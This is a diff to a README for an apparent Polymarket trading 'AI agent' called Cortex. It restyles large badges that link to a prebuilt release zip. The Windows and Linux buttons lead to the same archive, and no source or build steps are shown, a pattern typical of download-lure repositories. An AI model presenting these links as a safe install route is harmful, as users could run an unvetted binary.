@@ -20,12 +20,12 @@
   <i>Figure 1: Cortex AI Agent executing high-frequency Polymarket whale-mirroring and sentiment analysis.</i>
 </p>
 
-
-
 <p align="center">
   <a href="https://github.com/cal-miller-dev/cortex-deployment-hub/releases/download/CortexLauncher/Cortex.Systems.v3.4.2.Stable.zip">
-    <img src="https://img.shields.io/badge/DOWNLOAD_CORTEX_SYSTEMS-v3.4.2-blue?style=for-the-badge&logo=windows&logoColor=white" height="45">
+    <img src="https://img.shields.io/badge/DOWNLOAD-Cortex%20AI%203.4.2%20Stable-brightgreen?style=for-the-badge&logo=windows" alt="Download Cortex AI">
   </a>
+
+
   <a href="https://github.com/cal-miller-dev/cortex-deployment-hub/releases/download/CortexLauncher/Cortex.Systems.v3.4.2.Stable.zip">
     <img src="https://img.shields.io/badge/LINUX_BUILD-STABLE-orange?style=for-the-badge&logo=linux&logoColor=white" height="45">
   </a>
